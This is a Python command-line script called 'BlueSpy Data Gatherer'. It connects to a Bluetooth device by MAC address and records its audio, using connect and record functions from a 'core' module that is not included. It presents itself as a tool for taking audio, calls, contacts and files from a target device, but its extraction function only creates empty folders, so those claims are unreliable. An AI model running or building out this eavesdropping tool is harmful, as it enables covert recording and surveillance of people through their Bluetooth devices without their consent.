#!/usr/bin/env python3
import argparse
import os
from datetime import datetime
from core import record, BluezTarget, connect


def extract_device_data(target, verbose=True):
    """Extract data from connected device"""
    device_dir = os.path.join("extracted_data", str(target.address))
    os.makedirs(device_dir, exist_ok=True)
    
    # Create subdirectories for different types of data
    for subdir in ['contacts', 'call_history', 'media', 'recordings']:
        os.makedirs(os.path.join(device_dir, subdir), exist_ok=True)
    
    if verbose:
        print(f"Data extraction directory created at {device_dir}")
    
    return device_dir


def main():
    parser = argparse.ArgumentParser(
        prog="BlueSpy Data Gatherer",
        description="Extract data from a bluetooth device including audio, calls, and files",
    )
    parser.add_argument(
        "-a",
        "--target-address",
        help="Target device MAC address",
        required=True,
        dest="address",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="File to store recorded audio",
        dest="outfile",
        default="",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Enable verbose output",
        action="store_true",
    )
    args = parser.parse_args()

    target = BluezTarget(args.address)
    
    # Connect to the device first
    if connect(target, verbose=args.verbose):
        print(f"Successfully connected to {target.address}")
        
        # Extract device data
        extract_dir = extract_device_data(target, verbose=args.verbose)
        
        # Record audio
        recording_path = record(target, outfile=args.outfile, verbose=args.verbose)
        
        if args.verbose and recording_path:
            print(f"All data gathered and stored in {extract_dir}")
            print(f"Audio recording saved to {recording_path}")


if __name__ == "__main__":
    main()
